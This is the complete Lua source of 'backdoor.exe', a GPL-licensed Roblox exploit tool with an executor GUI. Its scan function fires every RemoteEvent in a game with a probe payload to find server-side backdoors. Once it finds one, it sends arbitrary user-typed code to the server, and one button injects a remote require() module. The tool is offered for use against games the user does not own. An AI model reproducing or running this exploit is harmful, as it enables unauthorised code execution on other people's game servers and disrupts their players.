-- backdoor.exe v5 source
--[[
backdoor.exe, a free and powerfull backdoor scanning tool for Roblox games.
Copyright (C) 2021  iK4oS

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.
]]
--[[
	CREDITS
	iK4oS: Head Developer
	Bubba: Developer

	RBX_Solutions, for your exploiting needs

	*var names in caps are constants
			(constants never change)
]]

local metaService = setmetatable({}, {
	-- Quicker service indexing
	__index = function(_, k)
		return game:GetService(k)
	end
})

local LocalPlayer = metaService.Players.LocalPlayer

--## CONSTANTS ##--
local SALT = "561265310" -- A constant to check for dubs
local ASSET_ID = "rbxassetid://6688719810"
local LOGO_ID = "rbxassetid://6332656641"
local GUI_DESTINATION = metaService.CoreGui.RobloxGui
local VERSION = "X.15"

function notify(text)
	 metaService.StarterGui:SetCore(
		"SendNotification",{
			Title = "Backdoor.exe",
			Text = text,
			Icon = LOGO_ID
		}
	)
end

-- Deleting UI dublicate
for _, gui in pairs(GUI_DESTINATION:GetChildren()) do
	if gui:IsA("ScreenGui") and string.match(gui.Name, SALT) then
		gui:Destroy()
	end
end

-- Gettings the UI
local GUI = game:GetObjects(ASSET_ID)[1]
if syn then syn.protect_gui(GUI) end -- If you use Synapse the UI will be protected with this
GUI.Parent = GUI_DESTINATION
GUI.Name = SALT..tostring(math.random(100000000,1000000000))


-- ## UI_PARTS ## --
local LOADING_POPUP = GUI.loadingPopUp
local LOGO_POPUP = LOADING_POPUP.ImageLabel

local MAIN = GUI.main

local ACCOUNT_FRAME = MAIN.accountFrame

-- Begin Bottombar --
local BOTTOMBAR = MAIN.bottombar 
local VERSION_LABEL = BOTTOMBAR.Version 
local STATUS = BOTTOMBAR.Status

-- End Bottombar, Begin Executor --
local EXECUTOR_FRAME = MAIN.executorFrame 
local EXECUTOR_BUTTONS = EXECUTOR_FRAME.executorButtons 

local SOURCE_FRAME = EXECUTOR_FRAME.sourceFrame 
local SOURCE_SCRIPT = SOURCE_FRAME.source

-- End Executor, Begin Settings --
local SETTINGS_FRAME = MAIN.settingsFrame
local CUSTOM_SPEED_FRAME = SETTINGS_FRAME.customSpeedBox
local CUSTOM_SPEED_TEXT = CUSTOM_SPEED_FRAME.TextBox
local CUSTOM_SPEED_BUTTON = CUSTOM_SPEED_FRAME.customSpeedButton

local CACHING_BUTTON = SETTINGS_FRAME.cachingButton 
local CLEAR_CACHE_BUTTON = SETTINGS_FRAME.clearCache

local VERBOSE_BUTTON = SETTINGS_FRAME.verboseButton

-- End Settings, Begin Sidebar --
local SIDEBAR = MAIN.sidebar

-- End Sidebar, Begin Topbar --
local TOPBAR = MAIN.topbar
local CLOSE_BUTTON = TOPBAR.close
-- End Topbar --

local HOME_FRAME = MAIN.homeFrame 
local INFO_FRAME = MAIN.infoFrame 
local SERVER_LOCK_FRAME = MAIN.serverlockFrame

-- ## Setup ## --
-- Just some variables that will change while use
local uiIndex = {
	CurrentFrame = HOME_FRAME,
	CurrentButton = SIDEBAR.homeButton,
	CanUseBeforeScan = {"homeButton","infoButton","settingsButton"}
}
local settings = {
	Found = false,
	BackdoorRemote = nil,
}

-- Begin Logo Popup --

LOADING_POPUP:Destroy()
MAIN.Visible = true
-- End Logo Popup -- 

VERSION_LABEL.Text = "Version: "..VERSION

-- ## Functions ## --
function switchToFrame(newFrame, button)
	if settings.Found or table.find(uiIndex.CanUseBeforeScan, button.Name) then
		-- Switching Frame
		uiIndex.CurrentFrame.Visible = false
		newFrame.Visible = true
		uiIndex.CurrentFrame = newFrame

		-- Switching button color
		button.ImageColor3 = Color3.fromRGB(255, 192, 66)
		uiIndex.CurrentButton.ImageColor3 = Color3.fromRGB(255, 255, 255)
		uiIndex.CurrentButton = button
	else
		notify("You can not use this, scan first.")
	end
end

function attach()
	-- Will be called when a backdoor is found
	notify("Backdoor Found")
	settings.Found = true
	STATUS.Text = "Attached: "..settings.BackdoorRemote:GetFullName()

	for _, button in pairs(SIDEBAR:GetChildren()) do
		if button.ClassName == "ImageButton" and button ~= uiIndex.CurrentButton then
			button.ImageColor3 = Color3.fromRGB(255, 255, 255)
		end
	end
end

function stringToInstance(str) -- Credits to the DevForum
	local dir = str
	local segments = dir:split(".")
	local current = game
	for i, v in pairs(segments) do
		 current = current[v]
	end
	return current
end

function check(vn)
	if workspace:FindFirstChild(vn) then
		settings.BackdoorRemote = stringToInstance(workspace:FindFirstChild(vn).Value)
		workspace:FindFirstChild(vn):Destroy()
		return true
	end
end

function scan()
	settings.Found = false
	VALUE_NAME = SALT..math.random(100000, 999999)

	for _, testRemote in pairs(game:GetDescendants()) do
		if testRemote.ClassName == "RemoteEvent" and not found then
			TEST_SCRIPT = "a=Instance.new('StringValue',workspace) a.Name='"..VALUE_NAME.."' a.Value='"..testRemote:GetFullName().."'"

			testRemote:FireServer(TEST_SCRIPT)
			game:GetService("RunService").Stepped:Wait()
			
			if check(VALUE_NAME) then
				
				attach()
				return
			end
		end
	end
	-- It is not found
	wait(1.5) -- Wait for possible server lag
	if check(VALUE_NAME) then
		attach()
		return
	end
	notify("Failed to find a backdoor")
end


 -- ## SIDEBAR BUTTONS ## --
for _, button in pairs(SIDEBAR:GetChildren()) do
	if button.ClassName == "ImageButton" then

		button.MouseButton1Click:Connect(function()
			frameName = (string.split(button.Name,"Button")[1].."Frame")
			if(MAIN:FindFirstChild(frameName)) then

				newFrame = MAIN:FindFirstChild(frameName)
				switchToFrame(newFrame, button)

			else
				if(button.Name == "attachButton") then
					-- Attach button is pressed
					scan()
				else
					notify("Not made")
				end
			end
		end)

	end
end

 -- ## EXECUTE BUTTONS ## --

for _, button in pairs(EXECUTOR_BUTTONS:GetChildren()) do
	if button.ClassName == "TextButton" then
		button.MouseButton1Click:Connect(function()
			if settings.Found then
				if button.Name == "clearButton" then
					SOURCE_SCRIPT.Text = ""
				elseif button.Name == "executeButton" then
					--print(SOURCE_SCRIPT.Text)
					settings.BackdoorRemote:FireServer(SOURCE_SCRIPT.Text)
				elseif button.Name == "R6Button" then
					settings.BackdoorRemote:FireServer('require(3041175937):r6("' .. LocalPlayer.Name .. '")')
				end
			end
		end)
	end
end

CLOSE_BUTTON.MouseButton1Click:Connect(function()
	MAIN:TweenPosition(UDim2.new(0, 0, -1, 0))
	wait(1)
	GUI:Destroy()
end)

-- ## SETTING BUTTONS ## --

for _, button in pairs(SETTINGS_FRAME:GetDescendants()) do
	if button.ClassName == "TextButton" then
		button.MouseButton1Click:Connect(function()
			notify("Work in Progress")
		end)
	end
end

-- ## DRAGABLE ## --
local UserInputService = game:GetService("UserInputService")
local gui = MAIN
local dragging
local dragInput
local dragStart
local startPos
EasingDir = Enum.EasingDirection.Out
EasingSty = Enum.EasingStyle.Quint
EasingTim = 0.69 --nice
EasingOve = true

local function update(input)
	local delta = input.Position - dragStart
	gui:TweenPosition(
			UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y),
			EasingDir,
			EasingSty,
			EasingTim,
			EasingOve
	)
	game:GetService("RunService").Stepped:Wait()
end
gui.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging = true
		dragStart = input.Position
		startPos = gui.Position
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)
gui.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
		dragInput = input
	end
end)
UserInputService.InputChanged:Connect(function(input)
	if input == dragInput and dragging then
		update(input)
	end
end)


